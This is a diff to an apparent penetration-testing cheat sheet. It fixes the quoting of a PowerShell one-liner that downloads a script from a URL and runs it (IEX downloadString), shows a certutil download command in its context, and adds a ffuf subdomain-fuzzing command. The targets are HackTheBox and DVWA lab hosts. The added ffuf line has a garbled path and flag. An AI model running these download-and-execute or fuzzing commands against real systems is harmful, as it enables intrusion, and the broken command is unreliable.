@@ -182,7 +182,7 @@ certutil.exe -f -urlcache -split <url>
 ```
 
 ```
-powershell IEX(New-Object Net.WebClient).downloadString('<url>')"
+powershell IEX(New-Object Net.WebClient).downloadString('<url>')
 ```
 
 -----------
@@ -303,6 +303,10 @@ dirsearch -u 192.168.0.109 -w /usr/share/wordlists/dirbuster/directory-list-2.3-
 ffuf -w /usr/share/wordlists/dirb/big.txt -u http://monitors.htb/FUZZ -c -t 200 -mc 200,204,301,302,307,401,405,403
 ffuf -w /usr/share/wordlists/dirb/big.txt -u "http://10.10.10.238/FUZZ" -c -t 200 -fc 403
 fuf -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt -u "http://localhost/dvwa/vulnerabilities/fi/?page=FUZZ" -b "security=low; PHPSESSID=9dpvhricbfl5aj58qses365ehk" -c -t 200 -fl=80
+```
+
+```
+ffuf -w /usr&share/wordlist/Seclist/Discovery/DNS/subdomains-top1million-110000.txt -u "http://forge.htb" -H "Host:FUZZ.forge.htb" -t 200 fl 10
 ```
 
 ### GoBuster
